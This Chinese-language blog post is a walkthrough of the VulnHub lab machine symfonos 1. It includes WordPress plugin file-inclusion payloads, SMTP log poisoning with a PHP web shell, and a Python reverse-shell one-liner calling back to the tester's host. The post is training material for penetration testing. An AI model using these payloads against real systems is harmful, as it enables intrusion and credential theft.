<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"rerestst.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="本文内容纯属虚构！ 将靶机网络连接设置成为NAT。 靶机IP地址：192.168.31.145 测试机IP地址：192.168.31.37">
<meta property="og:type" content="article">
<meta property="og:title" content="symfonos 1_VulnHub靶机攻略">
<meta property="og:url" content="https://rerestst.github.io/2022/04/11/symfonos%201_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/index.html">
<meta property="og:site_name" content="rerestst&#39;s blog">
<meta property="og:description" content="本文内容纯属虚构！ 将靶机网络连接设置成为NAT。 靶机IP地址：192.168.31.145 测试机IP地址：192.168.31.37">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-04-11T12:14:23.000Z">
<meta property="article:modified_time" content="2024-01-09T04:25:05.555Z">
<meta property="article:author" content="rerestst">
<meta property="article:tag" content="VulnHub">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://rerestst.github.io/2022/04/11/symfonos%201_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://rerestst.github.io/2022/04/11/symfonos%201_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/","path":"2022/04/11/symfonos 1_VulnHub靶机攻略/","title":"symfonos 1_VulnHub靶机攻略"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>symfonos 1_VulnHub靶机攻略 | rerestst's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">rerestst's blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">6</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">18</span></a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">外部信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="nav-number">1.0.1.</span> <span class="nav-text">目录结构</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.0.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SMB%E7%A9%BA%E5%8F%A3%E4%BB%A4%E7%99%BB%E5%BD%95"><span class="nav-number">1.0.3.</span> <span class="nav-text">SMB空口令登录</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8%E6%B3%84%E9%9C%B2%E7%9A%84SMB%E5%8F%A3%E4%BB%A4%E8%AE%BF%E9%97%AE"><span class="nav-number">2.</span> <span class="nav-text">尝试使用泄露的SMB口令访问</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WordPress"><span class="nav-number">2.0.1.</span> <span class="nav-text">WordPress</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%90%9C%E7%B4%A2%E5%BE%88%E9%AA%8C%E8%AF%81WordPress%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.0.2.</span> <span class="nav-text">搜索很验证WordPress插件漏洞</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8LFI%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.</span> <span class="nav-text">利用LFI漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SMTP%E6%97%A5%E5%BF%97%E6%8A%95%E6%AF%92%E4%BD%BFLFI%E5%AE%9E%E7%8E%B0RCE"><span class="nav-number">3.0.1.</span> <span class="nav-text">SMTP日志投毒使LFI实现RCE</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#getshell"><span class="nav-number">3.0.2.</span> <span class="nav-text">getshell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.0.1.</span> <span class="nav-text">本地信息收集</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#statuscheck"><span class="nav-number">4.0.2.</span> <span class="nav-text">statuscheck</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="nav-number">4.0.3.</span> <span class="nav-text">劫持环境变量提权</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">5.</span> <span class="nav-text">其他</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#flag"><span class="nav-number">5.0.1.</span> <span class="nav-text">flag</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="rerestst"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">rerestst</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://rerestst.github.io/2022/04/11/symfonos%201_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rerestst">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="rerestst's blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="symfonos 1_VulnHub靶机攻略 | rerestst's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          symfonos 1_VulnHub靶机攻略
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-04-11 20:14:23" itemprop="dateCreated datePublished" datetime="2022-04-11T20:14:23+08:00">2022-04-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2024-01-09 12:25:05" itemprop="dateModified" datetime="2024-01-09T12:25:05+08:00">2024-01-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" itemprop="url" rel="index"><span itemprop="name">靶机攻略</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>本文内容纯属虚构！</p>
<p>将靶机网络连接设置成为NAT。</p>
<p>靶机IP地址：192.168.31.145</p>
<p>测试机IP地址：192.168.31.37</p>
<span id="more"></span>

<h3 id="外部信息收集"><a href="#外部信息收集" class="headerlink" title="外部信息收集"></a>外部信息收集</h3><p>访问<a target="_blank" rel="noopener" href="http://192.168.31.145/">http://192.168.31.145/</a>只显示了一个图片。</p>
<h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.145/FUZZ</span><br><span class="line">http://192.168.31.145/manual/</span><br><span class="line">http://192.168.31.145/image.jpg</span><br><span class="line">http://192.168.31.145/index.html</span><br></pre></td></tr></table></figure>



<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE     REASON         VERSION</span><br><span class="line">22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">25/tcp  open  smtp        syn-ack ttl 64 Postfix smtpd</span><br><span class="line">| ssl-cert: Subject: commonName=symfonos</span><br><span class="line">| Subject Alternative Name: DNS:symfonos</span><br><span class="line">| Issuer: commonName=symfonos</span><br><span class="line">|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8</span><br><span class="line">80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS HEAD GET</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X</span><br><span class="line">445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.5.16-Debian</span><br><span class="line"></span><br><span class="line">137/udp open  netbios-ns udp-response ttl 64 Samba nmbd netbios-ns</span><br></pre></td></tr></table></figure>



<h5 id="SMB空口令登录"><a href="#SMB空口令登录" class="headerlink" title="SMB空口令登录"></a>SMB空口令登录</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$  smbclient -L 192.168.31.145</span><br><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">print$          Disk      Printer Drivers</span><br><span class="line">helios          Disk      Helios personal share</span><br><span class="line">anonymous       Disk      </span><br><span class="line">IPC$            IPC       IPC Service (Samba 4.5.16-Debian)</span><br><span class="line"></span><br><span class="line">smbclient &quot;\\\\192.168.31.145\IPC$&quot;</span><br><span class="line">smb: \&gt; ls</span><br><span class="line"></span><br><span class="line">smbclient &quot;\\\\192.168.31.145\anonymous&quot;</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">attention.txt</span><br><span class="line">smb: \&gt; get attention.txt</span><br><span class="line"></span><br><span class="line">smbclient &quot;\\\\192.168.31.145\helios&quot;</span><br><span class="line">Password for [WORKGROUP\kali]:</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br><span class="line">smbclient &quot;\\\\192.168.31.145\print$&quot;</span><br><span class="line">Password for [WORKGROUP\kali]:</span><br><span class="line">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>也可以不用smbclient，直接kali文件夹访问smb:&#x2F;&#x2F;192.168.31.145&#x2F;</p>
<p>查看attention.txt内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Can users please stop using passwords like &#x27;epidioko&#x27;, &#x27;qwerty&#x27; and &#x27;baseball&#x27;! </span><br><span class="line">Next person I find using one of these passwords will be fired!</span><br><span class="line">-Zeus</span><br></pre></td></tr></table></figure>



<h3 id="尝试使用泄露的SMB口令访问"><a href="#尝试使用泄露的SMB口令访问" class="headerlink" title="尝试使用泄露的SMB口令访问"></a>尝试使用泄露的SMB口令访问</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">smbclient &quot;\\\\192.168.31.145\helios&quot; -U helios%qwerty</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">research.txt                        A      432  Fri Jun 28 20:32:05 2019</span><br><span class="line">todo.txt                            A       52  Fri Jun 28 20:32:05 2019</span><br><span class="line">smb: \&gt; get research.txt</span><br><span class="line">smb: \&gt; get todo.txt</span><br></pre></td></tr></table></figure>





<p>查看research.txt内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.</span><br></pre></td></tr></table></figure>



<p>未发现可用内容</p>
<p>查看todo.txt内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. Binge watch Dexter</span><br><span class="line">2. Dance</span><br><span class="line">3. Work on /h3l105</span><br></pre></td></tr></table></figure>



<p>发现&#x2F;h3l105目录</p>
<h5 id="WordPress"><a href="#WordPress" class="headerlink" title="WordPress"></a>WordPress</h5><p>访问<a target="_blank" rel="noopener" href="http://192.168.31.145/h3l105/%E5%8F%91%E7%8E%B0%E4%B8%80%E4%B8%AAWordPress%E9%A1%B5%E9%9D%A2">http://192.168.31.145/h3l105/发现一个WordPress页面</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo wpscan --url http://192.168.31.145/h3l105/ --enumerate vt,vp,u</span><br><span class="line">WordPress version 5.2.2 identified (Insecure, released on 2019-06-18)</span><br><span class="line">用户名admin</span><br><span class="line">http://192.168.31.145/h3l105/wp-content/uploads/</span><br></pre></td></tr></table></figure>





<p>对该页面使用BurpSuite抓包看到向服务器发请求时会请求域名symfonos.local</p>
<p>修改&#x2F;etc&#x2F;hosts：</p>
<p>192.168.31.145	symfonos.local</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ sudo wpscan --url http://symfonos.local/h3l105/</span><br><span class="line">Plugin(s)</span><br><span class="line">[+] mail-masta</span><br><span class="line"> | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2014-09-19T07:52:00.000Z</span><br><span class="line">[+] site-editor</span><br><span class="line"> | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/</span><br><span class="line"> | Latest Version: 1.1.1 (up to date)</span><br><span class="line"> | Last Updated: 2017-05-02T23:34:00.000Z</span><br></pre></td></tr></table></figure>



<h5 id="搜索很验证WordPress插件漏洞"><a href="#搜索很验证WordPress插件漏洞" class="headerlink" title="搜索很验证WordPress插件漏洞"></a>搜索很验证WordPress插件漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wordpress mail masta</span><br><span class="line">------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">------</span><br><span class="line">WordPress Plugin Mail Masta 1.0 - Local File Inclusion                       | php/webapps/40290.txt</span><br><span class="line">WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                   | php/webapps/50226.py</span><br><span class="line">WordPress Plugin Mail Masta 1.0 - SQL Injection                              | php/webapps/41438.txt</span><br><span class="line"></span><br><span class="line">searchsploit wordpress site editor</span><br><span class="line">$ searchsploit wordpress site editor</span><br><span class="line">------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">------</span><br><span class="line">WordPress Plugin Site Editor 1.1.1 - Local File Inclusion                    | php/webapps/44340.txt</span><br><span class="line">WordPress Plugin User Role Editor 3.12 - Cross-Site Request Forgery          | php/webapps/25721.txt</span><br><span class="line"></span><br><span class="line">searchsploit -m 40290.txt</span><br><span class="line">PoC</span><br><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</span><br><span class="line">存在LFI</span><br><span class="line"></span><br><span class="line">searchsploit -m 50226.py</span><br><span class="line">python2 50226.py</span><br><span class="line">~# http://symfonos.local/h3l105</span><br><span class="line">[*] Checking if the Mail-Masta endpoint is vulnerable...</span><br><span class="line">[!] Endpoint vulnerable!</span><br><span class="line"></span><br><span class="line">searchsploit -m 41438.txt</span><br><span class="line">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php</span><br><span class="line">sqlmap -u &quot;http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=0*&amp;pl=/var/www/html/wordpress/wp-load.php&quot; --batch</span><br><span class="line">验证失败</span><br><span class="line"></span><br><span class="line">searchsploit -m 44340.txt</span><br><span class="line">PoC：http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</span><br><span class="line">存在LFI</span><br><span class="line"></span><br><span class="line">结果</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:107:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">helios:x:1000:1000:,,,:/home/helios:/bin/bash</span><br><span class="line">mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">postfix:x:109:115::/var/spool/postfix:/bin/false</span><br></pre></td></tr></table></figure>



<h3 id="利用LFI漏洞"><a href="#利用LFI漏洞" class="headerlink" title="利用LFI漏洞"></a>利用LFI漏洞</h3><p>尝试：</p>
<p><a target="_blank" rel="noopener" href="http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=php://filter/convert.base64-encode/resource=../../../../../wp-config.php">http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=php://filter/convert.base64-encode/resource=../../../../../wp-config.php</a></p>
<p>失败，经过搭环境测试，猜想是once的原因，更换exp：</p>
<p><a target="_blank" rel="noopener" href="http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php">http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php</a></p>
<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;</span><br><span class="line">&#x27;DB_USER&#x27;, &#x27;wordpress&#x27; </span><br><span class="line">&#x27;DB_PASSWORD&#x27;, &#x27;password123&#x27;</span><br><span class="line">&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;</span><br></pre></td></tr></table></figure>



<p>利用该密码尝试连接SSH失败。</p>
<h5 id="SMTP日志投毒使LFI实现RCE"><a href="#SMTP日志投毒使LFI实现RCE" class="headerlink" title="SMTP日志投毒使LFI实现RCE"></a>SMTP日志投毒使LFI实现RCE</h5><p>利用LFI尝试读取Apache日志：<a target="_blank" rel="noopener" href="http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log">http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log</a></p>
<p>利用LFI尝试读取SMTP日志：<a target="_blank" rel="noopener" href="http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios">http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios</a></p>
<p>发现可以读取SMTP日志。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ nc 192.168.31.145 25</span><br><span class="line">220 symfonos.localdomain ESMTP Postfix (Debian/GNU)</span><br><span class="line">MAIL FROM:asdf</span><br><span class="line">250 2.1.0 Ok</span><br><span class="line">RCPT TO:helios</span><br><span class="line">250 2.1.5 Ok</span><br><span class="line">data</span><br><span class="line">354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</span><br><span class="line">&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</span><br><span class="line">.</span><br><span class="line">250 2.0.0 Ok: queued as 9ABDC4084A</span><br><span class="line">QUIT</span><br><span class="line">221 2.0.0 Bye</span><br><span class="line"></span><br><span class="line">http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;cmd=id</span><br><span class="line">uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br></pre></td></tr></table></figure>



<h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 443</span><br><span class="line"></span><br><span class="line">http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&amp;cmd=python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.37&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"></span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>



